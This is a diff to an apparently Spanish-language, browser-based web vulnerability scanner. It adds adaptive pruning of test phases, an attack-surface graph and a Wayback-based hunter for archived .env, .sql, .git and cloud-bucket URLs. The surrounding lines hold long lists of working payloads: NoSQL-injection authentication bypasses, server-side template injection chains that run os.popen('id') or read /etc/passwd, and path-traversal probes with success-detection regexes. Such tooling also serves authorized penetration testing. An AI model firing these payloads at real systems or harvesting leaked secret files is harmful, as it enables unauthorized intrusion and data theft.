-async function smartBatch(urls){var results=[];var c=Math.max(1,Math.min(aimd.concurrency,urls.length));for(var i=0;i<urls.length;i+=c){var chunk=urls.slice(i,i+c);var settled=await Promise.allSettled(chunk.map(function(u){return get(u);}));settled.forEach(function(s){results.push(s);});aimdAdjust(settled);var chunkAvg=0;settled.forEach(function(s){if(s.status==='fulfilled'&&s.value)chunkAvg+=s.value.time;});if(chunkAvg>0)rttTrack(chunkAvg/settled.length);}return results;}
+async function smartBatch(urls){
+var results=[];var c=Math.max(1,Math.min(aimd.concurrency,urls.length));
+var consecutiveDead=0,pruned=false;
+for(var i=0;i<urls.length;i+=c){
+var chunk=urls.slice(i,i+c);
+var settled=await Promise.allSettled(chunk.map(function(u){return get(u);}));
+for(var j=0;j<settled.length;j++){
+results.push(settled[j]);
+if(isDeadResult(settled[j])){consecutiveDead++;}else{consecutiveDead=0;}
+if(consecutiveDead>=3){pruned=true;break;}
+}
+aimdAdjust(settled);
+if(pruned)break;
+var chunkAvg=0;settled.forEach(function(s){if(s.status==='fulfilled'&&s.value)chunkAvg+=s.value.time;});
+if(chunkAvg>0)rttTrack(chunkAvg/settled.length);
+}
+if(pruned)results.pruned=true;
+return results;
+}
 async function headCheck(url){var t0=performance.now();try{var j=await pfx(url,{method:'HEAD'});var el=performance.now()-t0;if(!j)return{ok:false,status:0,headers:{},body:'',time:el};var h={};if(j.headers)for(var k in j.headers)h[k.toLowerCase()]=j.headers[k];return{ok:!!j.ok,status:j.status||0,headers:h,body:'',time:el,contentLength:parseInt(h['content-length']||'0',10),contentType:h['content-type']||''};}catch(e){return{ok:false,status:0,headers:{},body:'',time:performance.now()-t0};}}
 async function rangeGet(url){var t0=performance.now();try{var j=await pfx(url,{headers:{'Range':'bytes=0-127'}});var el=performance.now()-t0;if(!j)return{ok:false,status:0,headers:{},body:'',time:el};var h={};if(j.headers)for(var k in j.headers)h[k.toLowerCase()]=j.headers[k];var bd=(typeof j.body==='string')?j.body:'';var t=bd.slice(0,128);return{ok:!!j.ok,status:j.status||0,headers:h,body:t,time:el,magic:t.slice(0,8)};}catch(e){return{ok:false,status:0,headers:{},body:'',time:performance.now()-t0};}}
 var dnsCache=new Map();
@@ -15169,8 +15599,15 @@ if(ptReflects)logInfo('Cascada: parametro file refleja - probando LFI');
 else logInfo('Cascada: parametro file no refleja - probando lectura directa');
 var ptSkipWin=S.ctx.skipPhases&&S.ctx.skipPhases.indexOf('win-ini')>-1;
 var ptSkipPHP=S.ctx.skipPhases&&S.ctx.skipPhases.indexOf('php-filter')>-1;
-var ptAdaptive=ptTests.filter(function(t){if(ptSkipWin&&/win\.ini|boot\.ini|windows/i.test(t))return false;if(ptSkipPHP&&/php:\/\//.test(t))return false;return true;});
-if(ptSkipWin)logInfo('PRUNE: saltando payloads Windows ('+(ptTests.length-ptAdaptive.length)+' filtrados)');
+var ptSkipEtcPasswd=S.ctx.skipPhases&&S.ctx.skipPhases.indexOf('etc-passwd-traversal')>-1;
+var ptAdaptive=ptTests.filter(function(t){
+if(ptSkipWin&&/win\.ini|boot\.ini|windows/i.test(t))return false;
+if(ptSkipPHP&&/php:\/\//.test(t))return false;
+if(ptSkipEtcPasswd&&/etc\/(passwd|shadow|group|hosts)|proc\/self/i.test(t))return false;
+return true;
+});
+var ptPrunedCount=ptTests.length-ptAdaptive.length;
+if(ptPrunedCount>0)logInfo('PRUNE (S.ctx): '+ptPrunedCount+' payloads incompatibles filtrados ('+(ptSkipEtcPasswd?'target Windows — sin /etc/passwd':'target Linux — sin win.ini')+')');
 for(var ptb=0;ptb<ptAdaptive.length;ptb+=15){var ptChunk=ptAdaptive.slice(ptb,ptb+15);
 var ptResults=await smartBatch(ptChunk);
 for(var ptr2=0;ptr2<ptResults.length;ptr2++){if(ptResults[ptr2].status==='fulfilled'&&ptResults[ptr2].value&&ptResults[ptr2].value.ok&&ptResults[ptr2].value.body&&/root:x:0:0|bin\/bash|daemon:|\[fonts\]|extensions]/.test(ptResults[ptr2].value.body)){logErr('Path Traversal CONFIRMADO: '+ptChunk[ptr2].split('?')[1]);addF('crit','Path Traversal / LFI','/etc/passwd accesible');addEvidence('Path Traversal / LFI',ptChunk[ptr2],'GET',{},'','Archivo del sistema accesible via LFI');markCrit('p18');ptFound++;logChain('traversal','F18','LFI confirmed');break;}}
@@ -15259,6 +15696,7 @@ logOk('CRLF completo');
 
 /* F25: NoSQLi */
 await tp(24);logSep('F25 — NoSQL Injection');
+if(ctxSkip('nosqli')){logInfo('PRUNE (S.ctx): F25 omitida — JAMstack/estatico sin backend de datos detectado');}else{
 var nosqlTests=[target+'?id[$ne]=1',target+'?username[$regex]=.*&password[$regex]=.*',target+'?q={"$gt":""}',target+'?id[$gt]=0',target+'?name[$regex]=admin',target+'?id[$ne]=null',target+'?id[$exists]=true',target+'?id[$type]=string',target+'?id[$mod]=[10,1]',target+'?id[$where]=1==1',target+'?id[$in]=[1,2,3]',target+'?id[$nin]=[1]',target+'?username[$eq]=admin&password[$eq]=admin',target+'?username[$ne]=null&password[$ne]=null',target+'?q={"$where":"1==1"}',target+'?q={"$regex":".*"}',target+'?q={"$gt":null}',target+'?data={"user":"admin","pass":{"$ne":""}}',target+'?data={"username":"admin","password":{"$gt":""}}',target+'?q={"$or":[{"user":"admin"},{"user":"root"}]}',target+'?q={"$where":"sleep(3000)"}',target+'?id[$regex]=.*&password[$regex]=.*',target+'?username[$gt]=admin&password[$gt]=admin',target+'?id[$lt]=999999',target+'?id[$lte]=0',target+'?id[$gte]=0',target+'?id[$exists]=false',target+'?id[$type]=int',target+'?id[$mod]=[0,0]',target+'?id[$size]=1',target+'?id[$all]=[1,2,3]',target+'?id[$elemMatch]={$gt:0}',target+'?id[$not]={$gt:0}',target+'?id[$nor]=[{id:1}]',target+'?data={"$where":"1==1","$orderby":{"username":1}}',target+'?data={"username":{"$ne":"guest"},"password":{"$ne":"guest"}}',target+'?data={"email":{"$regex":"admin.*"}}',target+'?data={"username":{"$regex":"^admin"},"password":{"$ne":""}}',target+'?data={"$expr":{"$eq":["$username","admin"]}}',target+'?data={"$where":"this.username == \'admin\'"}',target+'?data={"username":{"$ne":"a"},"password":{"$ne":"a"}}'];
 var nosqlBase=await get(target+'?id=1');var nosqlBaseBody=nosqlBase.body||'';var nosqlBaseLen=nosqlBaseBody.length;
 var nosqlErrRe=/MongoError|MongoServerError|BSON|mongoose|MongooseError|MongoBulkWriteError|driverConnection|topology was destroyed|pool destroyed/i;
@@ -15280,6 +15718,7 @@ for(var nj=0;nj<nosqlJsonTests.length;nj++){var rnJ=await get(nosqlJsonTests[nj]
 if(rnJ.ok&&rnJ.body&&rnJ.body.length>nosqlBaseLen+500&&rnJ.body.indexOf('$ne')===-1&&rnJ.body.indexOf('$regex')===-1){logErr('NoSQLi JSON: respuesta ampliada con operador — bypass auth posible');addF('high','NoSQLi via JSON body','Bypass de autenticacion via JSON MongoDB');markCrit('p25');break;}
 if(rnJ.ok&&rnJ.body&&/ObjectId|_id|MongoDB|mongoose/i.test(rnJ.body)&&!/ObjectId|_id|MongoDB|mongoose/i.test(nosqlBaseBody)){logErr('NoSQLi JSON: documentos MongoDB expuestos');addF('high','NoSQLi JSON leak','Documentos MongoDB en respuesta');markCrit('p25');break;}}
 logOk('NoSQLi completo');
+}
 
 /* F26: Prototype Pollution */
 await tp(25);logSep('F26 — Prototype Pollution');
@@ -15333,6 +15772,7 @@ logOk('XXE probado');
 
 /* F31: SSTI */
 await tp(30);logSep('F31 — SSTI');
+if(ctxSkip('ssti')){logInfo('PRUNE (S.ctx): F31 omitida — JAMstack/estatico sin motor de templates server-side');}else{
 var sstiTests=[target+'?name={{7*7}}',target+'?name=${7*7}',target+'?name=#{7*7}',target+'?name=<%=7*7%>',target+'?name={{config}}',target+'?name={{self}}',target+'?name={{3*3}}',target+'?name={{.}}',target+'?name={{request}}',target+'?name={{session}}',target+'?name={{application}}',target+'?name={{response}}',target+'?name={{class}}',target+'?name={{ config.items() }}',target+'?name={{ cycler.__init__.__globals__ }}',target+'?name={{ namespace.__init__.__globals__ }}',target+'?name={{lipsum.__globals__}}',target+'?name={{ "".__class__.__mro__ }}',target+'?name={%25 debug %25}',target+'?name={%25 set x = 7*7 %25}{{x}}',target+'?name={{ "".__class__ }}',target+'?name={{ "".__class__.__mro__[1].__subclasses__() }}',target+'?name=${T(java.lang.Runtime).getRuntime()}',target+'?name=#{Runtime.getRuntime().exec("id")}',target+'?name={{config.SECRET_KEY}}',target+'?name={{config.items()}}',target+'?name={{request.application.__globals__}}',target+'?name={{request.environ}}',target+'?name={{config.from_envvar}}',target+'?name={{config.from_pyfile}}',target+'?name={{request.cookies}}',target+'?name={{request.headers}}',target+'?name={{request.environ[\'HTTP_HOST\']}}',target+'?name={{namespace.__init__.__globals__}}',target+'?name={{cycler.__init__.__globals__.os}}',target+'?name={{joiner.__init__.__globals__}}',target+'?name={{namespace.__init__.__globals__.os.popen(\'id\').read()}}',target+'?name={{\'\'.__class__.__mro__[1].__subclasses__()[40](\'/etc/passwd\').read()}}',target+'?name={{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',target+'?name={{lipsum.__globals__.os.popen(\'id\').read()}}',target+'?name={{cycler.__init__.__globals__.os.popen(\'id\').read()}}',target+'?name=${T(java.lang.Runtime).getRuntime().exec(\'id\')}',target+'?name=${7*7}{{7*7}}',target+'?name=#{7*7}${7*7}',target+'?name={{user.password}}',target+'?name={{session["username"]}}',target+'?name={{request["password"]}}',target+'?name={%25 import os %25}{{os.popen("id").read()}}',target+'?name={%25 set x=lipsum.__globals__.os.popen("id").read() %25}{{x}}',target+'?name={{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__[\'os\'].popen(\'id\').read()}}',target+'?name={{self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',target+'?name={{url_for.__globals__.os.popen(\'id\').read()}}',target+'?name={{get_flashed_messages.__globals__.os.popen(\'id\').read()}}',target+'?name={{config["SECRET_KEY"]}}',target+'?name={{config["SQLALCHEMY_DATABASE_URI"]}}',target+'?name={{config["DEBUG"]}}',target+'?name={{\'\'["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()}}',target+'?name={{[].__class__.__base__.__subclasses__()}}'];
 var sstiBase=await get(target+'?name=zxcvbnm123456');var sstiBaseBody=sstiBase.body||'';
 var sstiDiff=await get(target+'?name={{7*\'7\'}}');
@@ -15359,6 +15799,7 @@ if(rsstL.ok&&rsstL.body&&rsstL.body.indexOf('49')>-1&&rsstL.body.indexOf('<%')==
 if(rsstL.ok&&rsstL.body&&/Runtime|exec|system|child_process|IO\.popen|os\.exec|ERB|Tornado|TemplateError|TemplateSyntax/i.test(rsstL.body)&&!/Runtime|exec|system|child_process|IO\.popen|os\.exec|ERB|Tornado|TemplateError|TemplateSyntax/i.test(sstiBaseBody)){logErr('SSTI LANG: error o output de motor especifico detectado');addF('high','SSTI motor especifico detectado','Error/output revela ERB/Go/Tornado');markCrit('p31');break;}
 if(rsstL.ok&&rsstL.body&&/root:x:0:0|uid=\d+/.test(rsstL.body)&&!/root:x:0:0|uid=\d+/.test(sstiBaseBody)){logErr('SSTI LANG: RCE confirmado via ERB/Go/Tornado!');addF('crit','SSTI RCE en motor especifico','Ejecucion de comandos via template injection ERB/Go/Tornado');markCrit('p31');break;}}
 logOk('SSTI multi-motor completo');
+}
 
 /* F32: LDAP */
 await tp(31);logSep('F32 — LDAP Injection');
@@ -20430,6 +20871,283 @@ var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='l
 });
 
 });
+</script>
+
+<!-- ══ ATTACK SURFACE GRAPH + DATA LEAK HUNTER ══ -->
+<script>
+/* ═══ 1. ATTACK SURFACE GRAPH (vis-network) — módulo #warroom ═══ */
+(function(){
+'use strict';
+
+window.renderAttackGraph = function(rootDomain, subdomainsList, cvesList){
+  var container = document.getElementById('attack-graph');
+  if(!container) return null;
+  if(typeof vis === 'undefined'){
+    container.innerHTML = '<div style="padding:20px;color:var(--amber);font-family:var(--mono);font-size:12px;">⚠ vis-network no cargó (revisa conexión/CDN).</div>';
+    return null;
+  }
+
+  var emptyState = document.getElementById('attack-graph-empty');
+  if(emptyState) emptyState.style.display = 'none';
+
+  subdomainsList = Array.isArray(subdomainsList) ? subdomainsList : [];
+  cvesList = Array.isArray(cvesList) ? cvesList : [];
+
+  var nodes = [];
+  var edges = [];
+  var rootId = 'root';
+
+  nodes.push({
+    id: rootId,
+    label: rootDomain || 'target',
+    shape: 'diamond',
+    color: { background:'#ff1a2e', border:'#ff1a2e', highlight:{ background:'#ff4455', border:'#ffffff' } },
+    font: { color:'#ffffff', face:'Orbitron, var(--mono), monospace', size:15 },
+    size: 30,
+    borderWidth: 2
+  });
+
+  var subIds = {};
+  subdomainsList.slice(0, 80).forEach(function(sub, i){
+    var subId = 'sub'+i;
+    subIds[sub] = subId;
+    nodes.push({
+      id: subId,
+      label: sub.length > 28 ? sub.slice(0,26)+'…' : sub,
+      title: sub,
+      shape: 'dot',
+      color: { background:'#7b4fff', border:'#5c34d9', highlight:{ background:'#9b7fff', border:'#ffffff' } },
+      font: { color:'#f0eef8', size:11 },
+      size: 14
+    });
+    edges.push({ from: rootId, to: subId, color:{ color:'rgba(255,26,46,0.3)', highlight:'#ff1a2e' }, width:1, length:140 });
+  });
+
+  cvesList.slice(0, 60).forEach(function(cve, i){
+    var cveId = 'cve'+i;
+    var label = typeof cve === 'string' ? cve : (cve.id || cve.name || cve.title || 'Hallazgo');
+    var parentSubName = (cve && typeof cve === 'object') ? cve.subdomain : null;
+    var parentId = (parentSubName && subIds[parentSubName]) ? subIds[parentSubName] : rootId;
+    nodes.push({
+      id: cveId,
+      label: label,
+      title: (cve && cve.desc) ? cve.desc : label,
+      shape: 'box',
+      color: { background:'#ffb020', border:'#cc8c19', highlight:{ background:'#ffc95c', border:'#ffffff' } },
+      font: { color:'#000000', size:11 },
+      margin: 7
+    });
+    edges.push({ from: parentId, to: cveId, color:{ color:'rgba(255,176,32,0.4)', highlight:'#ffb020' }, width:1, dashes:true });
+  });
+
+  var data = { nodes: new vis.DataSet(nodes), edges: new vis.DataSet(edges) };
+
+  var options = {
+    autoResize: true,
+    layout: { improvedLayout: true, randomSeed: 42 },
+    interaction: { hover:true, tooltipDelay:120, zoomView:true, dragView:true, navigationButtons:true, keyboard:false },
+    physics: {
+      enabled: true,
+      solver: 'forceAtlas2Based',
+      forceAtlas2Based: { gravitationalConstant:-70, centralGravity:0.012, springLength:95, springConstant:0.09, damping:0.42, avoidOverlap:0.65 },
+      stabilization: { enabled:true, iterations:150, fit:true },
+      minVelocity: 0.8,
+      maxVelocity: 45,
+      timestep: 0.5,
+      adaptiveTimestep: true
+    },
+    nodes: { borderWidth:1.5, shadow:{ enabled:true, color:'rgba(0,0,0,.5)', size:6, x:0, y:2 } },
+    edges: { smooth:{ type:'continuous', roundness:0.4 } }
+  };
+
+  if(container._levNetwork){
+    try{ container._levNetwork.destroy(); }catch(e){}
+  }
+
+  var network = new vis.Network(container, data, options);
+
+  var physicsOff = false;
+  function killPhysics(){
+    if(physicsOff) return;
+    physicsOff = true;
+    try{ network.setOptions({ physics:false }); }catch(e){}
+  }
+  network.once('stabilizationIterationsDone', killPhysics);
+  /* Corte de seguridad: si el grafo es grande o el navegador es lento, no dejamos la física corriendo indefinidamente */
+  setTimeout(killPhysics, 4000);
+
+  container._levNetwork = network;
+  return network;
+};
+})();
+
+/* ═══ 2. DATA LEAK HUNTER — módulo #recon-engine ═══ */
+(function(){
+'use strict';
+
+var input   = document.getElementById('rce-input');
+var docsBtn = document.getElementById('rce-docs-btn');
+var resEl   = document.getElementById('rce-results');
+if(!input || !docsBtn || !resEl) return;
+
+/* Set en vez de array: lookup O(1) contra O(n) de Array.indexOf, relevante al filtrar
+   hasta 4000 filas del CDX de Wayback. .env/.sql/.bak/.json/.conf son las de mayor
+   probabilidad de filtrar secretos reales; .git se detecta aparte por patron de ruta
+   (no es una extension de archivo, es un directorio: /.git/config, /.git/HEAD, etc). */
+var LEAK_EXTENSIONS = new Set(['pdf','docx','xlsx','sql','env','bak','log','json','conf']);
+var GIT_PATH_RE = /\/\.git\//i;
+/* Heuristica pasiva de buckets huerfanos: si el dominio referencio alguna vez (via Wayback)
+   una URL de S3/GCS/R2, se reporta como candidato — sin verificar activamente (eso ya lo
+   hace la fase F276 de enumeracion de buckets del scanner). Cero peticiones extra: reusa
+   el mismo dataset de Wayback que ya se pidio para las extensiones criticas. */
+var BUCKET_HOST_RE = /([a-z0-9.\-]+)\.s3[.\-][a-z0-9\-]*amazonaws\.com|s3\.amazonaws\.com\/([a-z0-9.\-]+)|storage\.googleapis\.com\/([a-z0-9.\-_]+)|([a-z0-9.\-_]+)\.storage\.googleapis\.com|([a-z0-9.\-]+)\.r2\.cloudflarestorage\.com/i;
+var EXT_COLORS = {
+  pdf:'#ff4455', docx:'#60a5fa', xlsx:'#00c98d',
+  sql:'#ffb020', env:'#ff1a2e', bak:'#7b4fff', log:'rgba(240,238,248,.5)',
+  json:'#4fc3f7', conf:'#ffb020', git:'#ff1a2e', bucket:'#00c98d'
+};
+
+function leakEsc(s){
+  return String(s == null ? '' : s).replace(/[&<>"']/g, function(c){
+    return { '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c];
+  });
+}
+
+function copyLeakLink(text, btnEl){
+  var done = function(){
+    var old = btnEl.innerHTML;
+    btnEl.innerHTML = '<i class="fa-solid fa-check"></i>';
+    setTimeout(function(){ btnEl.innerHTML = old; }, 1500);
+  };
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(done).catch(function(){
+      var ta = document.createElement('textarea');
+      ta.value = text; document.body.appendChild(ta); ta.select();
+      try{ document.execCommand('copy'); }catch(e){}
+      document.body.removeChild(ta); done();
+    });
+  }
+}
+
+function extOf(url){
+  var m = url.split('?')[0].match(/\.([a-z0-9]+)$/i);
+  return m ? m[1].toLowerCase() : '';
+}
+
+function riskLabel(ext){
+  if(ext === 'env' || ext === 'sql' || ext === 'bak' || ext === 'git' || ext === 'conf') return { txt:'ALTO RIESGO', cls:'crit' };
+  if(ext === 'log' || ext === 'json' || ext === 'bucket') return { txt:'RIESGO MEDIO', cls:'med' };
+  return { txt:'REVISAR', cls:'low' };
+}
+
+function renderLeakCard(domain, items){
+  var existing = document.getElementById('rce-card-leaks');
+  if(existing) existing.remove();
+
+  var bodyHTML;
+  if(!items.length){
+    bodyHTML = '<div class="rce-empty">No se encontraron documentos indexados con esas extensiones en fuentes pasivas (Wayback Machine).</div>';
+  } else {
+    bodyHTML = items.map(function(it, i){
+      var color = EXT_COLORS[it.ext] || 'rgba(240,238,248,.5)';
+      var risk = riskLabel(it.ext);
+      return ''
+        + '<div class="rce-row" style="align-items:center;gap:10px;flex-wrap:wrap;">'
+        +   '<span class="rce-tag" style="border-color:'+color+';color:'+color+';text-transform:uppercase;">.'+leakEsc(it.ext)+'</span>'
+        +   '<a href="'+leakEsc(it.url)+'" target="_blank" rel="noopener noreferrer" style="color:var(--acc);word-break:break-all;flex:1;min-width:180px;font-family:var(--mono);font-size:12px;">'+leakEsc(it.url)+'</a>'
+        +   '<span class="rce-tag '+risk.cls+'" style="font-size:9px;">'+risk.txt+'</span>'
+        +   (it.timestamp ? '<span style="font-size:10px;color:rgba(240,238,248,.4);font-family:var(--mono);">'+leakEsc(it.timestamp.slice(0,8))+'</span>' : '')
+        +   '<button type="button" class="leak-copy-btn" data-url="'+leakEsc(it.url)+'" title="Copiar enlace" style="background:transparent;border:1px solid rgba(240,238,248,.2);color:rgba(240,238,248,.6);border-radius:3px;padding:3px 7px;cursor:pointer;font-size:11px;">'
+        +     '<i class="fa-solid fa-copy"></i>'
+        +   '</button>'
+        + '</div>';
+    }).join('');
+  }
+
+  var card = document.createElement('div');
+  card.className = 'rce-card';
+  card.id = 'rce-card-leaks';
+  card.innerHTML =
+    '<div class="rce-card-head">'
+    + '<span class="rce-card-icon">📄</span>'
+    + '<span class="rce-card-title">Documentos Públicos &amp; Metadatos</span>'
+    + '<span class="rce-card-count">'+items.length+' encontrados</span>'
+    + '</div>'
+    + '<div class="rce-card-body">'+bodyHTML+'</div>';
+
+  resEl.style.display = 'block';
+  resEl.appendChild(card);
+
+  card.querySelectorAll('.leak-copy-btn').forEach(function(b){
+    b.addEventListener('click', function(){ copyLeakLink(b.dataset.url, b); });
+  });
+}
+
+function huntLeaks(){
+  var raw = (input.value || '').trim();
+  if(!raw){ input.focus(); return; }
+  var domain = raw.replace(/^https?:\/\//,'').replace(/^www\./,'').split('/')[0];
+
+  docsBtn.disabled = true;
+  var origHTML = docsBtn.innerHTML;
+  docsBtn.innerHTML = '<span class="osint-spinner"></span> BUSCANDO...';
+
+  renderLeakCard(domain, []); // placeholder mientras carga
+  document.getElementById('rce-card-leaks').querySelector('.rce-card-body').innerHTML =
+    '<div class="rce-empty">Consultando índices pasivos (Wayback Machine CDX)…</div>';
+
+  /* Consulta 100% pasiva: preguntamos al índice de Internet Archive qué URLs
+     de este dominio ya tiene archivadas, y filtramos client-side por extensión.
+     No se envía ninguna petición al target en sí. */
+  var cdxUrl = 'https://web.archive.org/cdx/search/cdx?url='+encodeURIComponent(domain)
+    + '/*&output=json&collapse=urlkey&limit=4000&fl=timestamp,original,statuscode,mimetype';
+
+  fetch(cdxUrl)
+    .then(function(r){ if(!r.ok) throw new Error(r.status); return r.json(); })
+    .then(function(rows){
+      if(!Array.isArray(rows) || rows.length < 2) return [];
+      rows = rows.slice(1); // primera fila = encabezados
+      var seen = {};
+      var out = [];
+      var bucketSeen = {};
+      rows.forEach(function(row){
+        var timestamp = row[0], original = row[1];
+        if(!original) return;
+        /* Deteccion de bucket cloud: se evalua para TODA fila (no solo las que matchean
+           extension), ya que un bucket huerfano puede aparecer en cualquier tipo de URL. */
+        var bucketMatch = original.match(BUCKET_HOST_RE);
+        if(bucketMatch){
+          var bucketHost = (bucketMatch[1]||bucketMatch[2]||bucketMatch[3]||bucketMatch[4]||bucketMatch[5]||'').toLowerCase();
+          if(bucketHost && !bucketSeen[bucketHost]){
+            bucketSeen[bucketHost] = true;
+            out.push({ url: original, ext: 'bucket', timestamp: timestamp, bucketName: bucketHost });
+          }
+        }
+        if(seen[original]) return;
+        var ext = extOf(original);
+        var isGitPath = GIT_PATH_RE.test(original);
+        if(!isGitPath && !LEAK_EXTENSIONS.has(ext)) return;
+        seen[original] = true;
+        out.push({ url: original, ext: isGitPath ? 'git' : ext, timestamp: timestamp });
+      });
+      return out.slice(0, 60);
+    })
+    .then(function(items){
+      renderLeakCard(domain, items);
+    })
+    .catch(function(){
+      renderLeakCard(domain, []);
+      var body = document.querySelector('#rce-card-leaks .rce-card-body');
+      if(body) body.innerHTML = '<div class="rce-empty">⚠ No se pudo consultar Wayback Machine en este momento. Intenta de nuevo.</div>';
+    })
+    .finally(function(){
+      docsBtn.disabled = false;
+      docsBtn.innerHTML = origHTML;
+    });
+}
+
+docsBtn.addEventListener('click', huntLeaks);
+})();
 </script>
 
 
